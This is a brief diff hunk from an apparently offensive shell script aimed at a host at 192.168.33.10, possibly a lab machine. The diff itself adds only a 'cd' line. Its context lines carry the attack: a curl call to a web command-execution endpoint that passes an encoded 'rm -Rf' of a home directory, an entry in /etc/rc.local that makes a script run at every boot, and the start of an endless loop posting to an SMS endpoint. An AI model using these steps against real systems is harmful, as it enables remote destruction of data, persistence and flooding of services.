@@ -109,6 +109,7 @@ curl 'http://192.168.33.10:8098/exec.php?command=rm%20-Rf%20%2Fhost%2Fhome%2Fubu
 chmod 755 /home/ubuntu/22lr.bash
 echo /home/ubuntu/e-web-blaster.bash >> /etc/rc.local
 
+cd 
 echo "
 while [ 1 ]; do
 	curl --data 'sms=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!' http://192.168.33.10:3000/sms
